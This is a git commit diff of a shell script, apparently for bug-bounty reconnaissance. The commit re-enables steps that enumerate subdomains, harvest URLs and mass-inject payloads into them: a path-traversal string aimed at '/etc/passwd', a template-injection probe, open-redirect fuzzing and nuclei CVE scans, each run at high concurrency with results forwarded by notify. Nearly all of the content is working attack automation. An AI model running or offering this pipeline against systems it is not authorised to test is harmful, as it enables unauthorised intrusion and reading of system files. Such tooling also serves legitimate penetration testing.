63380b641599092287f86e1cfc0f82083dae495d
Sherwyn Moodley <forshish@gmail.com>
2020-11-11 08:39:31 -0500

    Update baggy.sh

--- baggy.sh
+++ baggy.sh
@@ -6,35 +6,35 @@ clear
 echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} Asset Finder ${reset}"
 echo '----------------------------------------------------------------------'
-#cat scope.txt | while read line; do ~/go/bin/assetfinder -subs-only $line | tee -a assets; done
+cat scope.txt | while read line; do ~/go/bin/assetfinder -subs-only $line | tee -a assets; done
 clear
 clear
 echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} Host Discovery ${reset}"
 echo '----------------------------------------------------------------------'
-#cat assets | ~/go/bin/httprobe -prefer-https | tee hosts
+cat assets | ~/go/bin/httprobe -prefer-https | tee hosts
 clear
 echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} Urls Gathering ${reset}"
 echo '----------------------------------------------------------------------'
-#cat hosts | sort -u | ~/go/bin/gau | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee gau
-#cat hosts | sort -u | ~/go/bin/waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee wayback
-#cat gau wayback | sort -u | tee -a urls
+cat hosts | sort -u | ~/go/bin/gau | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee gau
+cat hosts | sort -u | ~/go/bin/waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee wayback
+cat gau wayback | sort -u | tee -a urls
 clear
 echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} GF Sorting ${reset}"
 echo '----------------------------------------------------------------------'
-#mkdir gfsort
-#~/go/bin/gf --list | while read line; do cat urls | ~/go/bin/gf $line | tee gfsort/$line; done
+mkdir gfsort
+~/go/bin/gf --list | while read line; do cat urls | ~/go/bin/gf $line | tee gfsort/$line; done
 echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} Nuclei and Jaeles Testing per GF ${reset}"
 echo '----------------------------------------------------------------------'
 echo --------------------------------LFI------------------------------------
-#cat gfsort/lfi | ~/go/bin/qsreplace "../../../../etc/passwd" | ~/go/bin/httpx -match-regex 'root:x' -threads 300 | tee LFI.txt | ~/go/bin/notify
+cat gfsort/lfi | ~/go/bin/qsreplace "../../../../etc/passwd" | ~/go/bin/httpx -match-regex 'root:x' -threads 300 | tee LFI.txt | ~/go/bin/notify
 echo --------------------------------SSTI-----------------------------------
-#cat gfsort/ssti | ~/go/bin/qsreplace "SSTI{{9*9}}"  | ~/go/bin/httpx -match-regex 'SSTI81' -threads 300 | tee SSTI.txt | ~/go/bin/notify
+cat gfsort/ssti | ~/go/bin/qsreplace "SSTI{{9*9}}"  | ~/go/bin/httpx -match-regex 'SSTI81' -threads 300 | tee SSTI.txt | ~/go/bin/notify
 echo --------------------------------OPEN REDIRECT--------------------------
-#cat gfsort/redirect | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/open-redirect -u @ | ~/go/bin/notify
+cat gfsort/redirect | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/open-redirect -u @ | ~/go/bin/notify
 echo --------------------------------CVEs--------------------------
 cat gfsort/interesting* | sort -u | ~/go/bin/nuclei -t ~/nuclei-templates/cves/ -pbar -o CVEs.txt | ~/go/bin/notify &
 echo --------------------------------SQLi--------------------------
